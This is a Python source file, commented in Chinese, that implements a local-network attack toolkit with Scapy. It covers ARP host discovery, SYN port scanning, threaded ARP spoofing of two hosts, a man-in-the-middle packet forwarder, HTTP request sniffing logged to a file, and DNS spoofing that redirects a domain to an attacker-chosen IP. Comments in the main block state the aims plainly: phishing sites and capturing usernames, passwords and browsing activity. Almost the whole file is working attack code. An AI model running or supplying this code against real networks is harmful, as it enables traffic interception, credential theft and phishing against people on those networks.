# -*- coding:utf8 -*-
from scapy.all import *
from scapy.layers.inet import *
from scapy.layers.l2 import *
from scapy.layers.dns import *
from scapy.layers.http import *
import netifaces
import platform
import socket
from psutil import net_if_addrs
import threading
import logging
import requests
from bs4 import BeautifulSoup
import nmap

class Log:
    def __init__(self, filepath):
        logging.basicConfig(level=logging.INFO, filename=filepath, filemode='a',
                            format='%(asctime)s - %(pathname)s[line:%(lineno)d] - %(levelname)s: %(message)s')

    def dnInfo(self, dn):
        logging.info(dn)

    def getInfo(self, text):
        logging.info(text)

class ArpTable:
    def __init__(self, host):
        """
        :param host:  网卡主机
        """
        self.host = host
        self.des = []

    def addDes(self, ip, mac=None):
        """
        :param ip:
        :param mac:
        :return:  -1:失败  0 ：成功
        """
        obj = {}
        obj["ip"] = ip
        if not mac:
            obj["mac"] = self.host.getMacByIp(ip)
            if not obj["mac"]:
                print("the host of this ip is probably not on line")
                return -1
            else:
                self.des.append(obj)
                return 0
        else:
            obj["mac"] = mac
            self.des.append(obj)
            return 0

    def getDes(self):
        return self.des

class ArpAttack(threading.Thread):
    def __init__(self, decorateIp, virMac, targetIp, targetMac, time):
        threading.Thread.__init__(self)
        self.decorateIp = decorateIp
        self.virMac = virMac
        self.targetIp = targetIp
        self.targetMac = targetMac
        if time < 0.3:
            self.time = 0.3
        else:
            self.time = time

    def run(self):
        sp = Ether(dst=self.targetMac, src=self.virMac)/ARP(psrc=self.decorateIp, hwsrc=self.virMac,
                                                            pdst=self.targetIp, hwdst=self.targetMac, op=2)
        srploop(sp, inter=self.time)

class Sniff(threading.Thread):
    def __init__(self, name=None, count=0, filter=None, prn=None, lfilter=None, session=None):
        threading.Thread.__init__(self)
        self.__name = name
        self.__count = count
        self.__filter = filter
        self.__prn = prn
        self.lfilter = lfilter
        self.session = session

    def run(self):
        sniff(iface=self.__name, count=self.__count, prn=self.__prn, filter=self.__filter,
              lfilter=self.lfilter, session=self.session)


#主机mac
hostmac = None
#主机ip
hostip = None
#攻击对象mac 是否为网关
des1 = {}
#攻击对象ip
des2 = {}
def initrouteparam(netiface, arptable):
    global hostmac
    global hostip
    global des1
    global des2
    hostmac = netiface["host"]["mac"].lower()
    hostip = netiface["host"]["addr"]
    table = arptable.getDes()
    if len(table)==2:
        des1["addr"] = table[0]["ip"]
        des1["mac"] = table[0]["mac"]
        if des1["mac"] == netiface["gateway"]["mac"]:
            des1["way"] = True
        des2["addr"] = table[1]["ip"]
        des2["mac"] = table[1]["mac"]
        if des2["mac"] == netiface["gateway"]["mac"]:
            des2["way"] = True
        return 0
    else:
        print("攻击目标必须为两个")
        return -1

routeLock = threading.Lock()


def routeback(pkt):
    #因为过滤器的原因进来的必然为
    global hostmac
    global hostip
    if IP in pkt:
        srcmac = pkt[Ether].src
        dstip = pkt[IP].dst
        if srcmac == hostmac:  # 自己这边发出的包不需要再发送了
            return
        if dstip == hostip or dstip == "255.255.255.255":
            return
        # python 判断局域网因算法时间上问题 只转发攻击对象
        if dstip == des1["addr"]:  # 目的ip 是攻击目标的ip 需要转发
            pkt[Ether].src = hostmac
            pkt[Ether].des = des1["mac"]
        elif dstip == des2["addr"]:
            pkt[Ether].src = hostmac
            pkt[Ether].dst = des2["mac"]
        else:
            pkt[Ether].src = hostmac
            if des1["way"]:
                pkt[Ether].dst = des1["mac"]
            elif des2["way"]:
                pkt[Ether].dst = des2["mac"]
            else:
                return "check route"
        sendp(pkt)

log = Log("F:\\PCAP\\infor.txt")

def dnsreqback(pkt):
    global log
    if DNSQR in pkt:
        domain = pkt[DNSQR].qname.decode()
        if domain == "www.baidu.com.":
            dns_an = DNSRR(rrname=domain, rdata=jokers)
            repdata = IP(src=pkt[IP].dst, dst=pkt[IP].src)/UDP(dport=pkt[IP].sport, sport=53)
            repdata /= DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, qr=1, an=dns_an)
            send(repdata)
            log.dnInfo("成功将域名： " + domain + "  ip定向为： " + jokers)
        log.dnInfo("请求了： " + domain)


stars = lambda n: "*" * n


def httpanaysis(packet):
    if HTTPRequest in packet:
        global log
        log.getInfo("\n".join((
            stars(10) + "HttpRequest PACKET" + stars(10),
            "\n".join(packet.sprintf("{Raw:%Raw.load%}").split(r"\r\n")),
            stars(30))))


"""
    可认为是主机但实际其充当的角色为网卡
"""
class Host:
    def getMacByIp(self, ip):
        ans, unans = srp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(pdst=ip), timeout=2)
        for snd, rcv in ans:
            return rcv.sprintf("%Ether.src%")

    def __windows_getKey(self, ifname):
        """ windows 下获取网络
        :return:
        """
        import winreg as wr
        key_name = {}
        try:
            # 建立链接注册表，"HKEY_LOCAL_MACHINE"，None表示本地计算机
            reg = wr.ConnectRegistry(None, wr.HKEY_LOCAL_MACHINE)
            # 打开r'SYSTEM\CurrentControlSet\Control\Network\{4d36e972-e325-11ce-bfc1-08002be10318}'，固定的
            reg_key = wr.OpenKey(reg,
                                 r'SYSTEM\CurrentControlSet\Control\Network\{4d36e972-e325-11ce-bfc1-08002be10318}')
        except exception:
            print("路径出错或者其他问题，请仔细检查")
            sys.exit(-1)

        for i in self.interfaces:
            try:
                # 尝试读取每一个网卡键值下对应的Name
                reg_subkey = wr.OpenKey(reg_key, i + r'\Connection')
                # 如果存在Name，写入key_name字典
                key_name[wr.QueryValueEx(reg_subkey, 'Name')[0]] = i
            except FileNotFoundError:
                pass
        return key_name[ifname]

    def __init__(self):
        self.interfaces = netifaces.interfaces()
        self.__infor = None
        self.__name = None
        # print(routingGateway)
        # print(routingNicName)

    def __getName(self, name):
        if platform.system() == "Linux":
            return name
        elif platform.system() == "Windows":
            return self.__windows_getKey(name)
        else:
            print("本程序暂时不支持您的系统， 目前仅支持Linux, Windows")

    def __getIfAddress(self, name):
        """
        :param name:  在windows 下为 WLAN 或以太网 具体适配器选项中查看
                       linux 可通过ifconfig 查看
        :return:
        """
        if platform.system() == "Linux":
            try:
                return netifaces.ifaddresses(name)
            except ValueError:
                return None
        elif platform.system() == "Windows":
            key = self.__windows_getKey(name)
            if not key:
                return
            else:
                return netifaces.ifaddresses(key)
        else:
            print("本程序暂时不支持您的系统， 目前仅支持Linux, Windows")

    def getIpV4InforWithBuffer(self, name=None):
        if not self.__infor:
            self.__infor = self.getIpV4Infor(name)
            self.__name = name
        return self.__infor

    def getIpV4Infor(self, name):
        """
        :param name:  在windows 下为 WLAN 或以太网 具体适配器选项中查看
                       linux 可通过ifconfig 查看
        :return:
        """
        ret = {}
        ret["host"] = self.__getIfAddress(name)[netifaces.AF_INET][0]
        for k, v in net_if_addrs().items():
            if k == name:
                for item in v:
                    address = item.address
                    if ('-' in address or ':' in address) and len(address) == 17:
                        ret["host"]["mac"] = address.replace("-", ":")
                        break

        gateway = {}
        gateway["addr"] = netifaces.gateways()[netifaces.AF_INET][0][0]
        gateway["mac"] = self.getMacByIp(gateway["addr"])
        ret["gateway"] = gateway
        return ret

    def getIpV6Infor(self, name):
        print("注意暂时还没有深度支持")
        return self.__getIfAddress(name)[netifaces.AF_INET6][0]

    def portscan(self, ip, dport, name=None, timeout=2):
        ans, unans = sr(IP(dst=ip) / TCP(sport=666, dport=dport, flags="S"), timeout=timeout)
        r = []
        for pkt in ans:
            if pkt[1][TCP].flags == "SA":
                r.append(pkt[1][TCP].sport)
        return r

    def arpscan(self, name=None, timeout=2):
        """
        网卡局域网内的所有子ip
        :return:
        """
        host = self.getIpV4InforWithBuffer(name)
        hosts = []
        if host["host"]["netmask"] == "255.255.255.0":
            d = host["host"]["addr"].split(".")
            md = ""
            if len(d) == 4:
                md = d[0]+"."+d[1]+"."+d[2]+"."+"0/24"
            else:
                return hosts
            ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=md), timeout=timeout)
            for pkt in ans:
                hosts.append(dict(ip=pkt[1][ARP].psrc, mac=pkt[1][ARP].hwsrc))
            return hosts

    def __get_httpbanner(self, url):
        try:
            r = requests.get(url, timeout=2, allow_redirects=True)
            print(r.headers)
            soup = BeautifulSoup(r.content, 'lxml')
            print(soup)
            return soup.title.text.strip('\n').strip()
        except Exception as e:
            print(e)
            pass

    def __get_socket_info(self, target, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((target, port))
            info = s.recv(1024).decode().split('\r\n')[0].strip('\r\n')
            if info:
                return info
            s.send('HELLO\r\n')
            return s.recv(1024).decode().split('\r\n')[0].strip('\r\n')
        except Exception as e:
            print(e)
            pass
        finally:
            s.close()

    def getDetailInfoByNmap(self, tgthosts, tgtPorts):
        x = len(tgtPorts)
        if x == 0:
            return
        strport = str(tgtPorts[0])
        for i in range(1, x):
            strport += "," + tgtPorts[i]
        nm = nmap.PortScanner()
        result = nm.scan(tgthosts, strport)
        return result['scan']



    def simplescan(self,  ports, name=None, timeout=2):
        hosts = self.arpscan(name=name, timeout=timeout)
        for h in hosts:
            ps = self.portscan(h["ip"], ports, name, timeout)
            h["ports"] = ps
        return hosts

    def sniff(self, name=None, count=0, filter=None, prn=None, lfilter=None, session=None):
        if not name:
            s = Sniff(name=self.__name, count=count, prn=prn, filter=filter, lfilter=lfilter, session=session)
            s.start()
        else:
            s = Sniff(name=name, count=count, prn=prn, filter=filter, lfilter=lfilter, session=session)
            s.start()

    def httpRequestSniff(self, arpTable,  prn=None):
        table = arpTable.getDes()
        if len(table) == 2:
            filter = "host " + table[0]["ip"] + " or host " + table[1]["ip"]
        else:
            return -1
        return self.sniff(filter=filter, prn=prn, session=TCPSession)

    def route(self, arpTable):
        if platform.system() == "Linux":
            if os.geteuid() == 0:
                tail_0 = os.popen("sudo sysctl -w net.ipv4.ip_forward=1")
                print("ip转发设置:" + tail_0.read())
                return 0
        table = arpTable.getDes()
        if len(table) == 2:
            filter = "host "+table[0]["ip"]+" or host "+table[1]["ip"]
        else:
            return -1
        return self.sniff(name=self.__name, filter=filter, prn=routeback)

    def arpSpoof(self, arpTable, name=None, time=0.5):
        """
        :param arpTable: [IP1,IP2]
            拦截信息分为2中情况：
                1.欺骗主机和网关 拦截目标和网关之间的通讯 arpTable 中分别有网关ip和欺骗主机的ip
                2.欺骗2太内网主机 拦截2台内网主机间的通讯  arpTable 中分别为两台主机的ip
        :param name:
                使用的网卡名称 如果有选择过则可不配置
        :return: 0: 成功开启欺骗 -1: arpTable必须要有2个
        """
        device = self.getIpV4InforWithBuffer(name)
        table = arpTable.getDes()
        if len(table) == 2:
            ip1 = table[0]["ip"]
            mac1 = table[0]["mac"]
            ip2 = table[1]["ip"]
            mac2 = table[1]["mac"]
            # 欺骗1号自己是2号   欺骗2号自己是1号
            arpAttack1 = ArpAttack(decorateIp=ip2, virMac=device["host"]["mac"], targetIp=ip1,
                                  targetMac=mac1, time=time)
            arpAttack1.start()
            # print(device["host"]["mac"])
            arpAttack2 = ArpAttack(decorateIp=ip1, virMac=device["host"]["mac"], targetIp=ip2,
                                   targetMac=mac2, time=time)
            arpAttack2.start()
            return 0
        else:
            return -1

    def dnsSpoof(self, arpTable, dns_ip):
        global jokers
        jokers = dns_ip
        table = arpTable.getDes()
        if len(table) == 2:
            filter = "host " + table[0]["ip"] + " or host " + table[1]["ip"]
        else:
            return -1
        self.sniff(name=self.__name, prn=dnsreqback, filter=filter)


def pack_callback(packet):
    packet.show()


if __name__ == "__main__":
    # 在windows 下为 WLAN 或以太网 具体适配器选项中查看
    # linux 可通过ifconfig 查看
    ifacename = "WLAN"
    host = Host()
    ports = list([80, 8080, 3128, 8081, 9098])  # http
    ports.append(1080)  # socks代理
    ports.append(21)  # ftp
    ports.append(23)  # telnet
    ports.append(443)  # https
    ports.append(135)  # 打印机
    ports.append(139)
    ports.append(22)  # ssh scp
    ports.append(25)  # smtp
    ports.append(110)  # pop3
    ports.append(9080)  # webshpere 应用
    ports.append(9090)  # webshpere 管理工具
    ports.append(3306)  # mysql
    ports.append(3389)  # 远程登录
    ports.append(1521)  # oracle
    ports.append(1158)  # oracle emctl
    ports.append(2100)  # oracle xdb ftp
    ports.append(1433)  # sqlserver
    ports.append(1434)  # sqlserver
    ports.append(8886)
    # print(host.getDetailInfoByNmap("192.168.1.1", [80]))
    # 局域网内主机（0，10000）之间的端口号 有哪些服务
    # 更详细的内容自行使用nmap
    hs = host.simplescan(ports, ifacename, timeout=1)

    for mid in hs:
        print(mid)

    # print(host.arpscan(ifacename))
    # host.portscan("192.168.2.161", (0, 81))
    # host.arpscan()
    # print(host.getIpV4InforWithBuffer(ifacename))
    # 关于确定ip地址  nmap 端口扫描可以告诉ip主机名等   或者路由器中查询  或者直接在目标设备上查看  arp -a
    """
    arpTable = ArpTable(host)
    ret = arpTable.addDes("192.168.2.1")
    if ret == -1:
        exit()
    ret = arpTable.addDes("192.168.2.114")
    if ret == -1:
        exit()
    """
    # 可使用 fragroute或者 操作系统自带的路由转发代替 ***先开转发后开欺骗
    #initrouteparam(host.getIpV4InforWithBuffer(ifacename), arpTable)  # 初始化转发器所需要的必要参数
    # 使用此功能效果不理想
    # ***核心代码在 routeback 转发前可以对包进一步处理（^_^）
   # ret = host.route(arpTable)  # 特质的转发器(效果不太好) 通用转发器是不需要arpTable参数的 建议linux 下使用

    # 能够使用ettercap 应用程序代替此代码
   # ret = host.arpSpoof(arpTable=arpTable, name=ifacename, time=0.5)

    # 现在就要做一些有意思的事情了
   # host.httpRequestSniff(arpTable=arpTable, prn=httpanaysis)
    # host.sniff(name="WLAN", count=0, prn=pack_callback, filter="net 192.168.2.183")
    # dns 欺骗  将给定域名定向到自己的服务器上 然后钓鱼网站等可随意
    # host.dnsSpoof(arpTable, "192.168.2.161")
    # 对通讯的数据进行监听解析 获取用户名密码  再浏览什么网站等 打开了哪些类型的app 信息收集
   # time.sleep(10000)
    # linux： ifconfig  window:具体适配器选项中查看
    # 指定主机的网卡  可获取 主机以及 网关的信息
    # print(host.getIpV4InforWithBuffer("WLAN"))
    # print(host.getIpV4InforWithBuffer(""))
    # print(host.getMacByIp("192.168.2.144"))
    # srloop(ARP(psrc="192.168.2.1", hwsrc="b8:81:98:13:d4:45", pdst="192.168.2.183", op=2), inter=0.3)
